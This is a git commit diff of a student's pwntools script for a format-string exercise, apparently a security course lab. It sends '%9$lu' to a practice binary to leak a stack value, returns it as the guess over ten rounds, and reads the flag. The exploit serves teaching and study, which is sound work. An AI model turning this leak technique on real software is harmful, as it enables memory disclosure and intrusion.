11310867d5273115e36c3e654e97a0e898ded1bf
linivan2003 <149336992+linivan2003@users.noreply.github.com>
2025-11-06 03:18:02 +0000

    part1 and part 2 done

--- assignment-2/1-format-me/part1.py
+++ assignment-2/1-format-me/part1.py
@@ -2,21 +2,34 @@
 from pwn import *
 
 context.terminal = ['tmux', 'splitw', '-h']
-exe = ELF("./format-me-test")
+exe = ELF("./format-me")
 
 r = process([exe.path])
 # r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line
 
+r.recvuntil(b"Welcome to the package sending service!\n")
+
 for _ in range(10):
     # Add your code Here
-    r.recvuntil(b"xxx") # Think about what should be received first?
-    r.sendline(b"xxx") # Add your format string code here!
-    leak = r.recvline()
-    # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
-    val = leak[idx_1:idx_2] # you need to fill in idx_1, and idx_2 by yourself
+    # print(f"round {_+1}")
+    r.recvuntil(b"Recipient? ") # Think about what should be received first?
     
-    r.recvuntil(b"xxx") #Think about what should be received?
+    r.sendline(b"%9$lu") # Add your format string code here!
+    
+    r.recvuntil(b"Sending to ")
+
+    leak = r.recvline()
+    # print(f"raw leak: {leak}")
+    # print(f"leak length: {len(leak)}")
+    # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
+    
+    val = leak[0:-1] # you need to fill in idx_1, and idx_2 by yourself
+    # print(f"extracted val: {val}")
+
+    r.recvuntil(b"Guess? ") #Think about what should be received?
+   
     r.sendline(val) 
+    # print(f"[sent: {val}")
     r.recvuntil(b"Correct")
 
 r.recvuntil(b"Here's your flag: ")
